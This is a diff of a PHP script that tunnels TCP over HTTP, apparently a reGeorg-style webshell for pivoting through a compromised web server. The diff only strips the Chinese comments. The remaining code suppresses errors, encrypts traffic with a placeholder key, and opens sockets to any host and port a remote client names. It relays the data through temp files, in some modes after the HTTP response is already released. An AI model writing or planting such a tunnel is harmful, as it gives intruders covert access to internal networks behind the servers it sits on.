@@ -5,7 +5,6 @@ error_reporting(0);
 ignore_user_abort(false);
 $KEY = 'CHANGE_ME';
 
-// ---- SHA256-CTR+HMAC 加密（无 openssl 依赖）----
 
 function deriveKeys($key) {
     $master = hash('sha256', $key, true);
@@ -51,7 +50,6 @@ function enc($data, $key) {
     return $nonce . $ct . $tag;
 }
 
-// ---- YSP 包解析 ----
 
 function mkPkt($flag, $sid, $seq, $ack, $data) {
     return pack('CNNNN', $flag, $sid, $seq, $ack, strlen($data)) . $data;
@@ -71,7 +69,6 @@ function readPkt($buf, &$off) {
     return $hdr;
 }
 
-// ---- 会话目录工具 ----
 
 function sessDir($key, $sid) {
     return sys_get_temp_dir() . '/ysock_h_' . md5($key) . '_' . $sid;
@@ -85,7 +82,6 @@ function sessCloseFlag($key, $sid) {
     return sessDir($key, $sid) . '/c';
 }
 
-// ---- 流式写入：加密并输出一个帧 ----
 
 function writeFrame($typeByte, $data, $key) {
     $payload = chr($typeByte) . $data;
@@ -94,7 +90,6 @@ function writeFrame($typeByte, $data, $key) {
     flush();
 }
 
-// ---- 原子追加到写缓冲 ----
 
 function atomicAppend($file, $data) {
     $fp = @fopen($file, 'a');
@@ -109,7 +104,6 @@ function atomicAppend($file, $data) {
     return false;
 }
 
-// ---- 原子读取并清空写缓冲 ----
 
 function atomicDrain($file) {
     $fp = @fopen($file, 'c+');
@@ -128,7 +122,6 @@ function atomicDrain($file) {
     return $data;
 }
 
-// ---- Half Duplex: 创建流式连接 ----
 
 function performHalfCreate($j, $KEY) {
     $enc = @base64_decode($j['d']);
@@ -137,7 +130,7 @@ function performHalfCreate($j, $KEY) {
     $raw = dec($enc, $KEY);
     if ($raw === null || strlen($raw) < 2) { echo '{"d":""}'; exit; }
 
-    // 解析 SYN 包
+
     $off = 2;
     $cnt = unpack('n', substr($raw, 0, 2))[1];
     $synPkt = null;
@@ -157,10 +150,10 @@ function performHalfCreate($j, $KEY) {
     $port = (ord($dd[1 + $hlen]) << 8) | ord($dd[2 + $hlen]);
     $target = "tcp://$host:$port";
 
-    // 连接目标
+
     $fp = @stream_socket_client($target, $eno, $estr, 5);
     if (!$fp) {
-        // 连接失败，返回 RST
+
         $rstFrame = pack('n', 1) . mkPkt(0x00, $sid, 0, $synPkt['seq'], '');
         $encrypted = enc($rstFrame, $KEY);
         echo '{"d":"' . base64_encode($encrypted) . '"}';
@@ -168,14 +161,14 @@ function performHalfCreate($j, $KEY) {
     }
     stream_set_blocking($fp, false);
 
-    // 创建会话目录
+
     $dir = sessDir($KEY, $sid);
     @mkdir($dir, 0755, true);
     $writeBuf = sessWriteBuf($KEY, $sid);
     $closeFlag = sessCloseFlag($KEY, $sid);
     file_put_contents($writeBuf, '', LOCK_EX);
 
-    // 禁用输出缓冲，设置流式响应头
+
     @ini_set('zlib.output_compression', 0);
     while (ob_get_level()) ob_end_clean();
     ob_implicit_flush(true);
@@ -183,64 +176,64 @@ function performHalfCreate($j, $KEY) {
     header('X-Accel-Buffering: no');
     header('Cache-Control: no-cache');
 
-    // 发送 ACK 帧 (type=0x00)
+
     writeFrame(0x00, '', $KEY);
 
-    // 流式主循环
+
     $lastActivity = time();
     while (true) {
-        // 检查客户端断开
+
         if (connection_aborted()) {
             @fclose($fp);
             break;
         }
 
-        // 检查关闭信号
+
         if (file_exists($closeFlag)) {
             @fclose($fp);
             break;
         }
 
-        // 原子读取并清空写缓冲 → 写入目标
+
         $writeData = atomicDrain($writeBuf);
         if (strlen($writeData) > 0) {
             @fwrite($fp, $writeData);
             $lastActivity = time();
         }
 
-        // stream_select 监听目标 socket（200ms 超时）
+
         $read = [$fp];
         $write = null;
         $except = null;
         $changed = @stream_select($read, $write, $except, 0, 200000);
 
         if ($changed > 0) {
-            // 循环读取所有可用数据
+
             $allData = '';
             while (true) {
                 $data = @fread($fp, 65536);
                 if ($data === false || strlen($data) === 0) break;
                 $allData .= $data;
-                // 非阻塞模式下可能还有数据，用短 select 检查
+
                 $r2 = [$fp];
-                $c2 = @stream_select($r2, $w2, $e2, 0, 10000); // 10ms
+                $c2 = @stream_select($r2, $w2, $e2, 0, 10000);
                 if ($c2 === 0 || $c2 === false) break;
             }
             if (strlen($allData) === 0 || feof($fp)) {
-                // 目标连接关闭
+
                 if (strlen($allData) > 0) {
                     writeFrame(0x01, $allData, $KEY);
                 }
                 @fclose($fp);
-                writeFrame(0x02, '', $KEY); // FIN
+                writeFrame(0x02, '', $KEY);
                 break;
             }
-            // 流式回传目标数据
+
             writeFrame(0x01, $allData, $KEY);
             $lastActivity = time();
         }
 
-        // 空闲超时（300 秒）
+
         if (time() - $lastActivity > 300) {
             @fclose($fp);
             writeFrame(0x02, '', $KEY);
@@ -248,13 +241,12 @@ function performHalfCreate($j, $KEY) {
         }
     }
 
-    // 清理会话文件
+
     @unlink($writeBuf);
     @unlink($closeFlag);
     @rmdir($dir);
 }
 
-// ---- Half Duplex: 写入数据到缓冲 ----
 
 function performHalfData($j, $KEY) {
     $sid = intval($j['id'] ?? 0);
@@ -277,7 +269,6 @@ function performHalfData($j, $KEY) {
     exit;
 }
 
-// ---- Half Duplex: 关闭会话 ----
 
 function performHalfClose($j, $KEY) {
     $sid = intval($j['id'] ?? 0);
@@ -289,13 +280,11 @@ function performHalfClose($j, $KEY) {
     exit;
 }
 
-// ---- 会话工具：读缓冲文件 ----
 
 function sessReadBuf($key, $sid) {
     return sessDir($key, $sid) . '/r';
 }
 
-// ---- 握手 ----
 
 function performHandshake($j, $KEY) {
     $enc = @base64_decode($j['d'] ?? '');
@@ -308,7 +297,6 @@ function performHandshake($j, $KEY) {
     exit;
 }
 
-// ---- Classic: 创建会话 ----
 
 function performClassicCreate($j, $KEY) {
     $enc = @base64_decode($j['d']);
@@ -353,17 +341,17 @@ function performClassicCreate($j, $KEY) {
     file_put_contents($writeBuf, '', LOCK_EX);
     file_put_contents($readBuf, '', LOCK_EX);
 
-    // 返回 ACK
+
     $ackFrame = pack('n', 1) . mkPkt(0x04, $sid, 0, $synPkt['seq'], '');
     $encrypted = enc($ackFrame, $KEY);
     echo '{"d":"' . base64_encode($encrypted) . '","id":"' . $sid . '"}';
 
-    // 释放 PHP worker
+
     if (function_exists('fastcgi_finish_request')) {
         fastcgi_finish_request();
     }
 
-    // 后台循环：读目标 → 写读缓冲，从写缓冲 → 写目标
+
     $lastActivity = time();
     while (true) {
         if (file_exists($closeFlag)) { @fclose($fp); break; }
@@ -388,7 +376,7 @@ function performClassicCreate($j, $KEY) {
                     atomicAppend($readBuf, $allData);
                 }
                 @fclose($fp);
-                // 设置 FIN 标志
+
                 @file_put_contents($dir . '/fin', '1');
                 break;
             }
@@ -415,13 +403,12 @@ function performClassicCreate($j, $KEY) {
     @rmdir($dir);
 }
 
-// ---- Classic: 轮询 ----
 
 function performClassicPoll($j, $KEY) {
     $sid = intval($j['id'] ?? 0);
     if ($sid === 0) { echo '{"d":""}'; exit; }
 
-    // 写入数据到写缓冲
+
     if (isset($j['d']) && !empty($j['d'])) {
         $enc = @base64_decode($j['d']);
         if ($enc !== false) {
@@ -435,7 +422,7 @@ function performClassicPoll($j, $KEY) {
         }
     }
 
-    // 从读缓冲取数据
+
     $readBuf = sessReadBuf($KEY, $sid);
     $data = '';
     if (file_exists($readBuf)) {
@@ -459,12 +446,10 @@ function performClassicPoll($j, $KEY) {
     exit;
 }
 
-// ---- 主入口：路由分发 ----
 
-// full duplex detection: PHP does not support continuous input stream, reject with empty response
 $ct = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';
 if (strpos($ct, 'application/octet-stream') === 0 && strpos($ct, 'application/json') === false) {
-    // PHP cannot do full duplex - return nothing so client degrades to half
+
     echo '';
     exit;
 }
